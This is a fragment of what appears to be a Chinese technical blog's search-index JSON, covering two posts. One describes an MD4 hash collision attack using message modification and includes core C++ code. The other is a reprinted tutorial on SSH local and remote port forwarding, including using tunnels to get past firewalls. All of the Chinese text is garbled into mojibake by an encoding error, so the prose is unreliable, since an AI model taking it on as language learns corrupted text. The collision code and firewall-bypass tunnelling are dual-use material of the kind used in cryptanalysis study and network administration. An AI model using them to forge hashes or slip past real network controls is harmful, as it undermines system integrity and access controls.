æ­¤å…¶åŸç†ä¸å•æ­¥æ¶ˆæ¯ä¿®æ”¹ç›¸åŒï¼Œè¿™é‡Œä¸ä½œè¿‡å¤šèµ˜è¿°ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œå¤šæ­¥æ¶ˆæ¯ä¿®æ”¹å¯ä»¥å°†ç¢°æ’æ¦‚ç‡æå‡åˆ° $2^{-6}$ ~ $2^{-2}$ï¼Œåªéœ€è¦è‡³å¤š $2^8$ æ¬¡ MD4 è¿ç®—ï¼Œè€ƒè™‘åˆ° MD4 è¿ç®—ä¸­ï¼Œå¡«å……è€—æ—¶å¯å¿½ç•¥ï¼Œè®¡ç®—æ—¶ä¸€å…±åªæœ‰ 48 è½® $\\phi$ å‡½æ•°è¿ç®—ï¼Œä¸” $\\phi$ å‡½æ•°ä¸­åªç”¨åˆ°äº†ä½è¿ç®—ä¸åŠ æ³•è¿ç®—ï¼Œè¯¥ç®—æ³•æ‰¾åˆ°ä¸€å¯¹ MD4 ç¢°æ’çš„æ¶ˆæ¯æ‰€éœ€è¦çš„æ—¶é—´åªéœ€ç”¨ç§’æ¥è®¡ç®—ã€‚ è€Œå•æ­¥æ¶ˆæ¯ä¿®æ”¹çš„åŸç†æ˜¯ååˆ†ç®€å•çš„ï¼šå¯¹äºä»»æ„ä¸€ä¸ªå˜é‡ $x$ï¼Œå¦‚æœæˆ‘ä»¬å¸Œæœ›ä»¤ $x$ çš„ç¬¬ $i$ ä½ä¸º 0ï¼Œåªéœ€è¦å°† $x$ ä¸ $y$ å¼‚æˆ–ä¸€ä¸‹ï¼Œå…¶ä¸­ $y$ çš„ç¬¬ $i$ ä½ä¸ $x$ çš„ç¬¬ $i$ ä½ç›¸åŒï¼Œå…¶ä½™ä½éƒ½ä¸º 0ã€‚è¿™æ˜¯ç”±éå¸¸ç®€å•åˆéå¸¸ç»å…¸çš„å¼‚æˆ–çš„æ€§è´¨å‘Šè¯‰æˆ‘ä»¬çš„ã€‚å¦‚æœæˆ‘ä»¬å¸Œæœ›ä»¤ $x$ çš„ç¬¬ $i$ ä½ä¸º 1ï¼Œæˆ–è€…å¸Œæœ›ä»¤ $x$ å’Œ $z$ çš„ç¬¬ $i$ ä½ç›¸ç­‰ï¼Œé‚£ä¹ˆåŸç†æ˜¯ç›¸åŒçš„ã€‚ ä½œè€…ç»™çš„ä¾‹å­æ˜¯å…³äº $m_1$ çš„ä¿®æ”¹ï¼š $$ d_1\\gets d_1\\oplus (d_{1,7} \\lll 6)\\oplus ((d_{1,8}\\oplus a_{1,8})\\lll 7)\\oplus ((d_{1,11}\\oplus a_{1,11})\\lll 10) $$ $$ m_1\\gets (d_1\\ggg 7) - d_0 - F(a_1, b_0, c_0) $$ æ³¨æ„æ­¤å¤„çš„ $d_{1,7}$ æŒ‡çš„æ˜¯ï¼šæœ€ä½ä½ä¸º $d_1$ çš„ç¬¬ 7 ä½ï¼Œå‰ 31 ä½å…¨ä¸º 0 çš„ä¸²ï¼Œä¹Ÿå› æ­¤éœ€è¦å·¦ç§» 6 ä½ï¼ˆä¼¼ä¹ä¸éœ€è¦å¾ªç¯å·¦ç§»ï¼Ÿï¼‰ã€‚ ç»è¿‡å•æ­¥æ¶ˆæ¯ä¿®æ”¹åï¼Œç¢°æ’æ¦‚ç‡æå‡åˆ°äº†çº¦ $2^{-25}$ï¼Œè¿™ä¸ªæ¦‚ç‡çœ‹èµ·æ¥å¾ˆå°ï¼Œä½†æ˜¯ç»è¿‡æµ‹è¯•ï¼Œæˆ‘å‘ç°åªéœ€è¦ $2^{24}$ ~ $2^{27}$ æ¬¡ MD4 è¿ç®—ï¼Œä¹Ÿå°±æ˜¯ 4-8 åˆ†é’Ÿå·¦å³å°±å¯ä»¥æ‰¾åˆ° MD4 ç¢°æ’ï¼Œä¸ç®—å¤ªæ…¢ï¼Ÿå°½ç®¡å¦‚æ­¤ï¼Œå¤šæ­¥æ¶ˆæ¯ä¿®æ”¹åœ¨ RIPEMD å’Œ MD5 çš„ç¢°æ’æ”»å‡»ä¸­çš„ä½œç”¨ï¼Œå°±ä¸¾è¶³è½»é‡äº†ã€‚ ","date":"2019-03-06","objectID":"/md4-collision/:3:2","tags":["Hash","ä½è¿ç®—","C/C++"],"title":"çŸ­å…µç›¸æ¥ï¼šMD4 ç¢°æ’æ”»å‡»","uri":"/md4-collision/"},{"categories":["å¯†ç å­¦"],"content":"ä»£ç å®ç° æˆ‘è§‰å¾— C++ åº”è¯¥ä¼šå¿«ä¸€ç‚¹äºæ˜¯ç”¨äº† C++ å®ç°ã€‚é¦–å…ˆæ˜¯è¦å®šä¹‰å¥½æ•°æ®ç»“æ„ã€‚ å…¶ä½™æ•°æ®ç»“æ„ï¼Œæ¯”å¦‚å­˜å‚¨ç§»ä½é‡çš„æ•°ç»„ã€å­˜å‚¨æ¶ˆæ¯ M ä¸ Mâ€™ çš„æ•°ç»„éƒ½å¾ˆå®¹æ˜“å®šä¹‰ï¼Œç„¶è€Œè¡¨ 6 ä¸­çš„å……åˆ†æ¡ä»¶å­˜å‚¨èµ·æ¥å´è®©äººå¾ˆå¤´ç–¼ã€‚å‡ ç»ä¿®æ”¹åï¼Œæˆ‘é‡‡ç”¨äº†å¦‚ä¸‹æ–¹å¼ï¼š ... // Following: {x=0, x=1, x==y} {{}, {}, {7}}, // a1 {{7}, {}, {8, 11}}, // d1 {{11}, {7, 8}, {26}}, // c1 {{8, 11, 26}, {7}, {}}, // b1 ... å¯¹ç…§è¡¨ 6 åº”è¯¥å¾ˆå¥½ç†è§£ã€‚ åˆ©ç”¨ unsigned ç±»å‹å­˜æ‰€æœ‰é“¾å˜é‡å’Œæ¶ˆæ¯å—ï¼ˆåŸå› ä¸Šé¢å·²ç»å†™äº†ï¼‰ï¼Œå®šä¹‰å¥½ FGH å‡½æ•°ï¼Œä»¥åŠå¾ªç¯ç§»ä½ã€å–ç‰¹å®šä½ç­‰è¾…åŠ©å‡½æ•°ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å®ç°æ ¸å¿ƒåŠŸèƒ½äº†ï¼š class Msg { public: Msg() {data = vec_u(16);} explicit Msg(const vec_u \u0026_data) {data = _data;} vec_u data; static unsigned modify(const int \u0026i); vec_u md4(); void print_val(const char name[], int length); private: void round1(); void round2(); void round3(); }; ä¸‰è½®å‹ç¼©å‡½æ•°å¾ˆç®€å•ï¼Œæ¯”è¾ƒéš¾çš„æ˜¯æ¶ˆæ¯ä¿®æ”¹ï¼š unsigned Msg::modify(const int \u0026i) { unsigned m = e(); chain_var[i] = l_rotate(chain_var[i-4] + F(chain_var[i-1], chain_var[i-2], chain_var[i-3]) + m, shift[i%4]); for (int j = 0; suf_cond[i][0][j]; ++j) chain_var[i] ^= bit(chain_var[i], suf_cond[i][0][j]); for (int j = 0; suf_cond[i][1][j]; ++j) chain_var[i] ^= bit(~chain_var[i], suf_cond[i][1][j]); for (int j = 0; suf_cond[i][2][j]; ++j) chain_var[i] ^= bit(chain_var[i], suf_cond[i][2][j]) ^ bit(chain_var[i-1], suf_cond[i][2][j]); m = r_rotate(chain_var[i], shift[i%4]) - chain_var[i-4] - F(chain_var[i-1], chain_var[i-2], chain_var[i-3]); return m; } æœ€ååœ¨ä¸»å‡½æ•°ä¸­è°ƒç”¨ä¿®æ”¹ï¼š for (int i = 4; i \u003c 20; ++i) m.data[i-4] = m_.data[i-4] = Msg::modify(i); // Construct differential m_.data[1] += (1\u003c\u003c31); m_.data[2] += (1\u003c\u003c31); m_.data[2] -= (1\u003c\u003c28); m_.data[12] -= (1\u003c\u003c16); è¿™é‡Œä»…ç»™å‡ºäº†æ ¸å¿ƒä»£ç ï¼Œä¸è¿‡ç†è§£äº†æ ¸å¿ƒä»£ç ï¼Œå…¶ä½™ç»†èŠ‚ä¹Ÿè¿åˆƒè€Œè§£äº†ã€‚æ€»çš„æ¥è¯´ï¼Œç†è§£è¿™ç¯‡è®ºæ–‡è¿˜æ˜¯é¢‡æœ‰éš¾åº¦çš„ï¼Œä»ç†è§£åŸç†åˆ°ä»£ç å®ç°ä¹Ÿä»æœ‰å¾ˆé•¿ä¸€æ®µè·ç¦»ã€‚ ","date":"2019-03-06","objectID":"/md4-collision/:4:0","tags":["Hash","ä½è¿ç®—","C/C++"],"title":"çŸ­å…µç›¸æ¥ï¼šMD4 ç¢°æ’æ”»å‡»","uri":"/md4-collision/"},{"categories":["æ¢ç´¢"],"content":"é©¾é©­é­”æ³•ï¼Œéœ€è¦å…ˆæŒæ¡é­”æ³•çš„åŸç†ã€‚ ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡è½¬è½½è‡ª IBM Developerã€‚çº æ­£äº†åŸæ–‡ä¸­çš„ä¸€äº›ç¬”è¯¯ã€‚ ","date":"2019-03-04","objectID":"/ssh-port-fwd/:0:0","tags":["SSH","ç½‘ç»œ"],"title":"å®æˆ˜ SSH ç«¯å£è½¬å‘","uri":"/ssh-port-fwd/"},{"categories":["æ¢ç´¢"],"content":"ç¬¬ä¸€éƒ¨åˆ† æ¦‚è¿° å½“ä½ åœ¨å’–å•¡é¦†äº«å—å…è´¹ WiFi çš„æ—¶å€™ï¼Œæœ‰æ²¡æœ‰æƒ³åˆ°å¯èƒ½æœ‰äººæ­£åœ¨çªƒå–ä½ çš„å¯†ç åŠéšç§ä¿¡æ¯ï¼Ÿå½“ä½ å‘ç°å®éªŒå®¤çš„é˜²ç«å¢™é˜»æ­¢äº†ä½ çš„ç½‘ç»œåº”ç”¨ç«¯å£ï¼Œæ˜¯ä¸æ˜¯æœ‰è‹¦éš¾è¨€ï¼Ÿæ¥çœ‹çœ‹ SSH çš„ç«¯å£è½¬å‘åŠŸèƒ½èƒ½ç»™æˆ‘ä»¬å¸¦æ¥ä»€ä¹ˆå¥½å¤„å§ï¼ ","date":"2019-03-04","objectID":"/ssh-port-fwd/:1:0","tags":["SSH","ç½‘ç»œ"],"title":"å®æˆ˜ SSH ç«¯å£è½¬å‘","uri":"/ssh-port-fwd/"},{"categories":["æ¢ç´¢"],"content":"ç«¯å£è½¬å‘æ¦‚è¿° è®©æˆ‘ä»¬å…ˆæ¥äº†è§£ä¸€ä¸‹ç«¯å£è½¬å‘çš„æ¦‚å¿µå§ã€‚æˆ‘ä»¬çŸ¥é“ï¼ŒSSH ä¼šè‡ªåŠ¨åŠ å¯†å’Œè§£å¯†æ‰€æœ‰ SSH å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯ä¹‹é—´çš„ç½‘ç»œæ•°æ®ã€‚ä½†æ˜¯ï¼ŒSSH è¿˜åŒæ—¶æä¾›äº†ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„åŠŸèƒ½ï¼Œè¿™å°±æ˜¯ç«¯å£è½¬å‘ã€‚å®ƒèƒ½å¤Ÿå°†å…¶ä»– TCP ç«¯å£çš„ç½‘ç»œæ•°æ®é€šè¿‡ SSH é“¾æ¥æ¥è½¬å‘ï¼Œå¹¶ä¸”è‡ªåŠ¨æä¾›äº†ç›¸åº”çš„åŠ å¯†åŠè§£å¯†æœåŠ¡ã€‚è¿™ä¸€è¿‡ç¨‹æœ‰æ—¶ä¹Ÿè¢«å«åš â€œéš§é“â€ï¼ˆtunnelingï¼‰ï¼Œè¿™æ˜¯å› ä¸º SSH ä¸ºå…¶ä»– TCP é“¾æ¥æä¾›äº†ä¸€ä¸ªå®‰å…¨çš„é€šé“æ¥è¿›è¡Œä¼ è¾“è€Œå¾—åã€‚ä¾‹å¦‚ï¼ŒTelnetï¼ŒSMTPï¼ŒLDAP è¿™äº› TCP åº”ç”¨å‡èƒ½å¤Ÿä»ä¸­å¾—ç›Šï¼Œé¿å…äº†ç”¨æˆ·åï¼Œå¯†ç ä»¥åŠéšç§ä¿¡æ¯çš„æ˜æ–‡ä¼ è¾“ã€‚è€Œä¸æ­¤åŒæ—¶ï¼Œå¦‚æœæ‚¨å·¥ä½œç¯å¢ƒä¸­çš„é˜²ç«å¢™é™åˆ¶äº†ä¸€äº›ç½‘ç»œç«¯å£çš„ä½¿ç”¨ï¼Œä½†æ˜¯å…è®¸ SSH çš„è¿æ¥ï¼Œé‚£ä¹ˆä¹Ÿæ˜¯èƒ½å¤Ÿé€šè¿‡å°† TCP ç«¯å£è½¬å‘æ¥ä½¿ç”¨ SSH è¿›è¡Œé€šè®¯ã€‚æ€»çš„æ¥è¯´ SSH ç«¯å£è½¬å‘èƒ½å¤Ÿæä¾›ä¸¤å¤§åŠŸèƒ½ï¼š åŠ å¯† SSH Client ç«¯è‡³ SSH Server ç«¯ä¹‹é—´çš„é€šè®¯æ•°æ®ã€‚ çªç ´é˜²ç«å¢™çš„é™åˆ¶å®Œæˆä¸€äº›ä¹‹å‰æ— æ³•å»ºç«‹çš„ TCP è¿æ¥ã€‚ å›¾ 1. SSH ç«¯å£è½¬å‘ å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œä½¿ç”¨äº†ç«¯å£è½¬å‘ä¹‹åï¼ŒTCP ç«¯å£ A ä¸ B ä¹‹é—´ç°åœ¨å¹¶ä¸ç›´æ¥é€šè®¯ï¼Œè€Œæ˜¯è½¬å‘åˆ°äº† SSH å®¢æˆ·ç«¯åŠæœåŠ¡ç«¯æ¥é€šè®¯ï¼Œä»è€Œè‡ªåŠ¨å®ç°äº†æ•°æ®åŠ å¯†å¹¶åŒæ—¶ç»•è¿‡äº†é˜²ç«å¢™çš„é™åˆ¶ã€‚ ","date":"2019-03-04","objectID":"/ssh-port-fwd/:1:1","tags":["SSH","ç½‘ç»œ"],"title":"å®æˆ˜ SSH ç«¯å£è½¬å‘","uri":"/ssh-port-fwd/"},{"categories":["æ¢ç´¢"],"content":"ç¬¬äºŒéƒ¨åˆ† æœ¬åœ°è½¬å‘ä¸è¿œç¨‹è½¬å‘ ","date":"2019-03-04","objectID":"/ssh-port-fwd/:2:0","tags":["SSH","ç½‘ç»œ"],"title":"å®æˆ˜ SSH ç«¯å£è½¬å‘","uri":"/ssh-port-fwd/"},{"categories":["æ¢ç´¢"],"content":"æœ¬åœ°è½¬å‘å®ä¾‹åˆ†æ æˆ‘ä»¬å…ˆæ¥çœ‹ç¬¬ä¸€ä¸ªä¾‹å­ï¼Œåœ¨å®éªŒå®¤é‡Œæœ‰ä¸€å° LDAP æœåŠ¡å™¨ LdapServerHostï¼Œä½†æ˜¯é™åˆ¶äº†åªæœ‰æœ¬æœºä¸Šéƒ¨ç½²çš„åº”ç”¨æ‰èƒ½ç›´æ¥è¿æ¥æ­¤ LDAP æœåŠ¡å™¨ã€‚å¦‚æœæˆ‘ä»¬ç”±äºè°ƒè¯•æˆ–è€…æµ‹è¯•çš„éœ€è¦æƒ³ä¸´æ—¶ä»è¿œç¨‹æœºå™¨ LdapClientHost ç›´æ¥è¿æ¥åˆ°è¿™ä¸ª LDAP æœåŠ¡å™¨ , æœ‰ä»€ä¹ˆæ–¹æ³•èƒ½å¤Ÿå®ç°å‘¢ï¼Ÿ ç­”æ¡ˆæ— ç–‘æ˜¯æœ¬åœ°ç«¯å£è½¬å‘äº†ï¼Œå®ƒçš„å‘½ä»¤æ ¼å¼æ˜¯ï¼š ssh -L \u003clocal port\u003e:\u003cremote host\u003e:\u003cremote port\u003e \u003cSSH hostname\u003e åœ¨ LdapClientHost ä¸Šæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤å³å¯å»ºç«‹ä¸€ä¸ª SSH çš„æœ¬åœ°ç«¯å£è½¬å‘ï¼Œä¾‹å¦‚ï¼š ssh -L 7001:localhost:389 LdapServerHost å›¾ 2. æœ¬åœ°ç«¯å£è½¬å‘ è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯æœ¬ä¾‹ä¸­æˆ‘ä»¬é€‰æ‹©äº† 7001 ç«¯å£ä½œä¸ºæœ¬åœ°çš„ç›‘å¬ç«¯å£ï¼Œåœ¨é€‰æ‹©ç«¯å£å·æ—¶è¦æ³¨æ„éç®¡ç†å‘˜å¸å·æ˜¯æ— æƒç»‘å®š 1-1023 ç«¯å£çš„ï¼Œæ‰€ä»¥ä¸€èˆ¬æ˜¯é€‰ç”¨ä¸€ä¸ª 1024-65535 ä¹‹é—´çš„å¹¶ä¸”å°šæœªä½¿ç”¨çš„ç«¯å£å·å³å¯ã€‚ ç„¶åæˆ‘ä»¬å¯ä»¥å°†è¿œç¨‹æœºå™¨ LdapClientHost ä¸Šçš„åº”ç”¨ç›´æ¥é…ç½®åˆ°æœ¬æœºçš„ 7001 ç«¯å£ä¸Šï¼ˆè€Œä¸æ˜¯ LDAP æœåŠ¡å™¨çš„ 389 ç«¯å£ä¸Šï¼‰ã€‚ä¹‹åçš„æ•°æ®æµå°†ä¼šæ˜¯ä¸‹é¢è¿™ä¸ªæ ·å­ï¼š æˆ‘ä»¬åœ¨ LdapClientHost ä¸Šçš„åº”ç”¨å°†æ•°æ®å‘é€åˆ°æœ¬æœºçš„ 7001 ç«¯å£ä¸Šï¼Œ è€Œæœ¬æœºçš„ SSH Client ä¼šå°† 7001 ç«¯å£æ”¶åˆ°çš„æ•°æ®åŠ å¯†å¹¶è½¬å‘åˆ° LdapServertHost çš„ SSH Server ä¸Šã€‚ SSH Server ä¼šè§£å¯†æ”¶åˆ°çš„æ•°æ®å¹¶å°†ä¹‹è½¬å‘åˆ°ç›‘å¬çš„ LDAP 389 ç«¯å£ä¸Šï¼Œ æœ€åå†å°†ä» LDAP è¿”å›çš„æ•°æ®åŸè·¯è¿”å›ä»¥å®Œæˆæ•´ä¸ªæµç¨‹ã€‚ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè¿™æ•´ä¸ªæµç¨‹åº”ç”¨å¹¶æ²¡æœ‰ç›´æ¥è¿æ¥ LDAP æœåŠ¡å™¨ï¼Œè€Œæ˜¯è¿æ¥åˆ°äº†æœ¬åœ°çš„ä¸€ä¸ªç›‘å¬ç«¯å£ï¼Œä½†æ˜¯ SSH ç«¯å£è½¬å‘å®Œæˆäº†å‰©ä¸‹çš„æ‰€æœ‰äº‹æƒ…ï¼ŒåŠ å¯†ï¼Œè½¬å‘ï¼Œè§£å¯†ï¼Œé€šè®¯ã€‚ è¿™é‡Œæœ‰å‡ ä¸ªåœ°æ–¹éœ€è¦æ³¨æ„ï¼š SSH ç«¯å£è½¬å‘æ˜¯é€šè¿‡ SSH è¿æ¥å»ºç«‹èµ·æ¥çš„ï¼Œæˆ‘ä»¬å¿…é¡»ä¿æŒè¿™ä¸ª SSH è¿æ¥ä»¥ä½¿ç«¯å£è½¬å‘ä¿æŒç”Ÿæ•ˆã€‚ä¸€æ—¦å…³é—­äº†æ­¤è¿æ¥ï¼Œç›¸åº”çš„ç«¯å£è½¬å‘ä¹Ÿä¼šéšä¹‹å…³é—­ã€‚ æˆ‘ä»¬åªèƒ½åœ¨å»ºç«‹ SSH è¿æ¥çš„åŒæ—¶åˆ›å»ºç«¯å£è½¬å‘ï¼Œè€Œä¸èƒ½ç»™ä¸€ä¸ªå·²ç»å­˜åœ¨çš„ SSH è¿æ¥å¢åŠ ç«¯å£è½¬å‘ã€‚ ä½ å¯èƒ½ä¼šç–‘æƒ‘ä¸Šé¢å‘½ä»¤ä¸­çš„ \u003cremote host\u003e ä¸ºä»€ä¹ˆç”¨ localhostï¼Œå®ƒæŒ‡å‘çš„æ˜¯å“ªå°æœºå™¨å‘¢ï¼Ÿåœ¨æœ¬ä¾‹ä¸­ï¼Œå®ƒæŒ‡å‘ LdapServertHostã€‚æˆ‘ä»¬ä¸ºä»€ä¹ˆç”¨ localhost è€Œä¸æ˜¯ IP åœ°å€æˆ–è€…ä¸»æœºåå‘¢ï¼Ÿå…¶å®è¿™ä¸ªå–å†³äºæˆ‘ä»¬ä¹‹å‰æ˜¯å¦‚ä½•é™åˆ¶ LDAP åªæœ‰æœ¬æœºæ‰èƒ½è®¿é—®ã€‚å¦‚æœåªå…è®¸ loopback æ¥å£è®¿é—®çš„è¯ï¼Œé‚£ä¹ˆè‡ªç„¶å°±åªæœ‰ localhost æˆ–è€… IP ä¸º 127.0.0.1 æ‰èƒ½è®¿é—®äº†ï¼Œè€Œä¸èƒ½ç”¨çœŸå® IP æˆ–è€…ä¸»æœºåã€‚ å‘½ä»¤ä¸­çš„ \u003cremote host\u003e å’Œ \u003cSSH hostname\u003e å¿…é¡»æ˜¯åŒä¸€å°æœºå™¨ä¹ˆï¼Ÿå…¶å®æ˜¯ä¸ä¸€å®šçš„ï¼Œå®ƒä»¬å¯ä»¥æ˜¯ä¸¤å°ä¸åŒçš„æœºå™¨ã€‚æˆ‘ä»¬åœ¨åé¢çš„ä¾‹å­é‡Œä¼šè¯¦ç»†é˜è¿°è¿™ç‚¹ã€‚ å¥½äº†ï¼Œæˆ‘ä»¬å·²ç»åœ¨ LdapClientHost å»ºç«‹äº†ç«¯å£è½¬å‘ï¼Œé‚£ä¹ˆè¿™ä¸ªç«¯å£è½¬å‘å¯ä»¥è¢«å…¶ä»–æœºå™¨ä½¿ç”¨ä¹ˆï¼Ÿæ¯”å¦‚èƒ½å¦æ–°å¢åŠ ä¸€å° LdapClientHost2 æ¥ç›´æ¥è¿æ¥ LdapClientHost çš„ 7001 ç«¯å£ï¼Ÿç­”æ¡ˆæ˜¯ä¸è¡Œçš„ï¼Œåœ¨ä¸»æµ SSH å®ç°ä¸­ï¼Œæœ¬åœ°ç«¯å£è½¬å‘ç»‘å®šçš„æ˜¯ loopback æ¥å£ï¼Œè¿™æ„å‘³ç€åªæœ‰ localhost æˆ–è€… 127.0.0.1 æ‰èƒ½ä½¿ç”¨æœ¬æœºçš„ç«¯å£è½¬å‘ , å…¶ä»–æœºå™¨å‘èµ·çš„è¿æ¥åªä¼šå¾—åˆ° connection refused.ã€‚å¥½åœ¨ SSH åŒæ—¶æä¾›äº† GatewayPorts å…³é”®å­—ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æŒ‡å®šå®ƒä¸å…¶ä»–æœºå™¨å…±äº«è¿™ä¸ªæœ¬åœ°ç«¯å£è½¬å‘ã€‚ ssh -g -L \u003clocal port\u003e:\u003cremote host\u003e:\u003cremote port\u003e \u003cSSH hostname\u003e ","date":"2019-03-04","objectID":"/ssh-port-fwd/:2:1","tags":["SSH","ç½‘ç»œ"],"title":"å®æˆ˜ SSH ç«¯å£è½¬å‘","uri":"/ssh-port-fwd/"},{"categories":["æ¢ç´¢"],"content":"è¿œç¨‹è½¬å‘å®ä¾‹åˆ†æ æˆ‘ä»¬æ¥çœ‹ç¬¬äºŒä¸ªä¾‹å­ï¼Œè¿™æ¬¡å‡è®¾ç”±äºç½‘ç»œæˆ–é˜²ç«å¢™çš„åŸå› æˆ‘ä»¬ä¸èƒ½ç”¨ SSH ç›´æ¥ä» LdapClientHost è¿æ¥åˆ° LDAP æœåŠ¡å™¨ LdapServertHostï¼Œä½†æ˜¯åå‘è¿æ¥å´æ˜¯è¢«å…è®¸çš„ã€‚é‚£æ­¤æ—¶æˆ‘ä»¬çš„é€‰æ‹©è‡ªç„¶å°±æ˜¯è¿œç¨‹ç«¯å£è½¬å‘äº†ã€‚ å®ƒçš„å‘½ä»¤æ ¼å¼æ˜¯ï¼š ssh -R \u003clocal port\u003e:\u003cremote host\u003e:\u003cremote port\u003e \u003cSSH hostname\u003e ä¾‹å¦‚åœ¨ LDAP æœåŠ¡å™¨ LdapServertHost ç«¯æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š ssh -R 7001:localhost:389 LdapClientHost å›¾ 3. è¿œç¨‹ç«¯å£è½¬å‘ å’Œæœ¬åœ°ç«¯å£è½¬å‘ç›¸æ¯”ï¼Œè¿™æ¬¡çš„å›¾é‡Œï¼ŒSSH Server å’Œ SSH Client çš„ä½ç½®å¯¹è°ƒäº†ä¸€ä¸‹ï¼Œä½†æ˜¯æ•°æ®æµä¾ç„¶æ˜¯ä¸€æ ·çš„ã€‚æˆ‘ä»¬åœ¨ LdapClientHost ä¸Šçš„åº”ç”¨å°†æ•°æ®å‘é€åˆ°æœ¬æœºçš„ 7001 ç«¯å£ä¸Šï¼Œè€Œæœ¬æœºçš„ SSH Server ä¼šå°† 7001 ç«¯å£æ”¶åˆ°çš„æ•°æ®åŠ å¯†å¹¶è½¬å‘åˆ° LdapServertHost çš„ SSH Client ä¸Šã€‚ SSH Client ä¼šè§£å¯†æ”¶åˆ°çš„æ•°æ®å¹¶å°†ä¹‹è½¬å‘åˆ°ç›‘å¬çš„ LDAP 389 ç«¯å£ä¸Šï¼Œæœ€åå†å°†ä» LDAP è¿”å›çš„æ•°æ®åŸè·¯è¿”å›ä»¥å®Œæˆæ•´ä¸ªæµç¨‹ã€‚ çœ‹åˆ°è¿™é‡Œï¼Œä½ æ˜¯ä¸æ˜¯ä¼šæœ‰ç‚¹ç³Šæ¶‚äº†ï¼Ÿä¸ºä»€ä¹ˆå«æœ¬åœ°è½¬å‘ï¼Œè€Œæœ‰æ—¶åˆå«è¿œç¨‹è½¬å‘ï¼Ÿè¿™ä¸¤è€…æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ ","date":"2019-03-04","objectID":"/ssh-port-fwd/:2:2","tags":["SSH","ç½‘ç»œ"],"title":"å®æˆ˜ SSH ç«¯å£è½¬å‘","uri":"/ssh-port-fwd/"},{"categories":["æ¢ç´¢"],"content":"æœ¬åœ°è½¬å‘ä¸è¿œç¨‹è½¬å‘çš„å¯¹æ¯”ä¸åˆ†æ ä¸é”™ï¼ŒSSH Serverï¼ŒSSH Clientï¼ŒLdapServertHostï¼ŒLdapClientHostï¼Œæœ¬åœ°è½¬å‘ï¼Œè¿œç¨‹è½¬å‘ï¼Œè¿™ä¹ˆå¤šçš„åè¯çš„ç¡®å®¹æ˜“è®©äººç³Šæ¶‚ã€‚è®©æˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹å…¶ä¸­çš„ç»“æ„å§ã€‚é¦–å…ˆï¼ŒSSH ç«¯å£è½¬å‘è‡ªç„¶éœ€è¦ SSH è¿æ¥ï¼Œè€Œ SSH è¿æ¥æ˜¯æœ‰æ–¹å‘çš„ï¼Œä» SSH Client åˆ° SSH Server ã€‚è€Œæˆ‘ä»¬çš„åº”ç”¨ä¹Ÿæ˜¯æœ‰æ–¹å‘çš„ï¼Œæ¯”å¦‚éœ€è¦è¿æ¥ LDAP Server æ—¶ï¼ŒLDAP Server è‡ªç„¶å°±æ˜¯ Server ç«¯ï¼Œæˆ‘ä»¬åº”ç”¨è¿æ¥çš„æ–¹å‘ä¹Ÿæ˜¯ä»åº”ç”¨çš„ Client ç«¯è¿æ¥åˆ°åº”ç”¨çš„ Server ç«¯ã€‚å¦‚æœè¿™ä¸¤ä¸ªè¿æ¥çš„æ–¹å‘ä¸€è‡´ï¼Œé‚£æˆ‘ä»¬å°±è¯´å®ƒæ˜¯æœ¬åœ°è½¬å‘ã€‚è€Œå¦‚æœä¸¤ä¸ªæ–¹å‘ä¸ä¸€è‡´ï¼Œæˆ‘ä»¬å°±è¯´å®ƒæ˜¯è¿œç¨‹è½¬å‘ã€‚ æˆ‘ä»¬å¯ä»¥å›å¿†ä¸Šé¢çš„ä¸¤ä¸ªä¾‹å­æ¥åšä¸ªå¯¹ç…§ã€‚ æœ¬åœ°è½¬å‘æ—¶ï¼š LdapClientHost åŒæ—¶æ˜¯åº”ç”¨çš„å®¢æˆ·ç«¯ï¼Œä¹Ÿæ˜¯ SSH Clientï¼Œè¿™ä¸¤ä¸ªè¿æ¥éƒ½ä»å®ƒæŒ‡å‘ LdapServertHostï¼ˆæ—¢æ˜¯ LDAP æœåŠ¡ç«¯ï¼Œä¹Ÿæ˜¯ SSH Serverï¼‰ã€‚ è¿œç¨‹è½¬å‘æ—¶ï¼š LdapClientHost æ˜¯åº”ç”¨çš„å®¢æˆ·ç«¯ï¼Œä½†å´æ˜¯ SSH Server ï¼›è€Œ LdapServertHost æ˜¯ LDAP çš„æœåŠ¡ç«¯ï¼Œä½†å´æ˜¯ SSH Client ã€‚è¿™æ ·ä¸¤ä¸ªè¿æ¥çš„æ–¹å‘åˆšå¥½ç›¸åã€‚ å¦ä¸€ä¸ªæ–¹ä¾¿è®°å¿†çš„æ–¹æ³•æ˜¯ï¼ŒServer ç«¯çš„ç«¯å£éƒ½æ˜¯é¢„å®šä¹‰çš„å›ºå®šç«¯å£ï¼ˆSSH Server çš„ç«¯å£ 22ï¼ŒLDAP çš„ç«¯å£ 389ï¼‰ï¼Œè€Œ Client ç«¯çš„ç«¯å£éƒ½æ˜¯åŠ¨æ€å¯ä¾›æˆ‘ä»¬é€‰æ‹©çš„ç«¯å£ï¼ˆå¦‚ä¸Šè¿°ä¾‹å­ä¸­é€‰ç”¨çš„ 7001 ç«¯å£ï¼‰ã€‚å¦‚æœ Server ç«¯çš„ä¸¤ä¸ªç«¯å£éƒ½åœ¨åŒä¸€å°æœºå™¨ï¼ŒClient ç«¯çš„ä¸¤ä¸ªç«¯å£éƒ½åœ¨å¦ä¸€å°æœºå™¨ä¸Šï¼Œé‚£ä¹ˆè¿™å°±æ˜¯æœ¬åœ°è¿æ¥ï¼›å¦‚æœè¿™å››ä¸ªç«¯å£äº¤å‰åˆ†å¸ƒåœ¨ä¸¤ä¸ªæœºå™¨ä¸Šï¼Œæ¯å°æœºå™¨å„æœ‰ä¸€ä¸ª Server ç«¯ç«¯å£ï¼Œä¸€ä¸ª Client ç«¯ç«¯å£ï¼Œé‚£å°±æ˜¯è¿œç¨‹è¿æ¥ã€‚ å¼„æ¸…æ¥šäº†ä¸¤è€…çš„åŒºåˆ«ä¹‹åï¼Œå†æ¥çœ‹çœ‹ä¸¤è€…çš„ç›¸åŒä¹‹å¤„ã€‚å¦‚æœä½ 